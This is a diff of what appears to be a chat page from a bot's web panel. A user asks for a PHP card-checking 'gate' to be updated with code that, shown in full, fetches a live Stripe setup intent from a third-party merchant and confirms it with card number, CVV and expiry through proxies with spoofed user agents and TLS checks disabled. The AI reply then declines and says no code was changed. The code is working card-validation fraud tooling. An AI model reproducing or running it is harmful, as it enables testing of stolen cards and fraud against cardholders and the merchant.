@@ -1,0 +1,33 @@
+Update /st /mst /msttxt gate with this code
+
+$ch = curl_init(); curl_setopt($ch, CURLOPT_PROXY, "http://$plink:$pport"); curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass"); curl_setopt($ch, CURLOPT_URL, 'https://ftstreaming.com/api/billings/setup_intent?page=checkouts&currency='); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'User-agent: '.$randomUserAgent.'', 'Access-Control-Allow-Origin: *', 'Accept: application/json', 'Sec-Fetch-Site: same-origin', 'Sec-Fetch-Mode: cors', 'Sec-Fetch-Dest: empty', 'Referer: https://ftstreaming.com/checkout/new?o=158072' )); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); $result_t_3 = curl_exec($ch); curl_close($ch);
+
+$data = json_decode($result_t_3, true);
+
+$fullIntent = $data['setup_intent'];
+
+$id = explode('_secret', $fullIntent)[0];
+
+// echo "Full Intent: " . $fullIntent . "\n"; // echo "ID: " . $id . "\n";
+
+#-------------------------------------------------------------------------------
+
+#final stripe request $ch = curl_init(); curl_setopt($ch, CURLOPT_PROXY, "http://$plink:$pport"); curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass"); curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$id.'/confirm'); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Accept: application/json', 'Content-Type: application/x-www-form-urlencoded', 'User-agent: '.$randomUserAgent.'', 'Origin: https://js.stripe.com', 'Sec-Fetch-Site: same-site', 'Sec-Fetch-Mode: cors', 'Sec-Fetch-Dest: empty', 'Referer: https://js.stripe.com/' )); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+
+#cvv curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc_main.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[allow_redisplay]=unspecified&payment_method_data[referrer]=https%3A%2F%2Fftstreaming.com&payment_method_data[billing_details][address][country]=US&&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=subscription&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_DImPqz7QOOyx70XCA9DSifxb&_stripe_account=acct_17xMTFKOTY4X9OXo&client_secret='.$fullIntent.'');
+
+$result = curl_exec($ch); // $time2 = curl_getinfo($ch, CURLINFO_TOTAL_TIME); curl_close($ch);
+
+I can’t update /st, /mst, or /msttxt to test cards through a third-party merchant’s live Stripe setup intents. That would enable live card validation, including bulk checks.
+
+I can help replace these gates with Stripe test-mode checks for a merchant account you control, using official test cards and keeping TLS verification enabled. No code has been changed.
+
+
+
+Onichan Web Panel
+Onichan Web Panel
+Website
+Onichan Bot
+Website
+Search tools…
+Open Onichan Bot
